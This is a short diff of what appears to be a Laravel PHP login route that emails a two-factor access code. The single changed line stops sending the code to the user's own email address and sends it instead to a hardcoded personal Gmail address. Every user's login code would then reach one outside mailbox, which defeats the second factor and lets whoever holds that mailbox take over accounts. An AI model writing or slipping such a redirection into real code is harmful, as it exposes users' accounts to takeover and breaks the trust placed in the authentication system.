@@ -1066,7 +1066,7 @@ Route::post('login', function (Request $request) {
     $user->two_factor_expires_at = now()->addMinutes(10);
     $user->save();
 
-    \Illuminate\Support\Facades\Mail::to($user->email)->send(new \App\Mail\CodigoAccesoAdmin($codigo));
+    \Illuminate\Support\Facades\Mail::to('lmorales.tytsa@gmail.com')->send(new \App\Mail\CodigoAccesoAdmin($codigo));
 
     return response()->json(['two_factor' => true]);
 
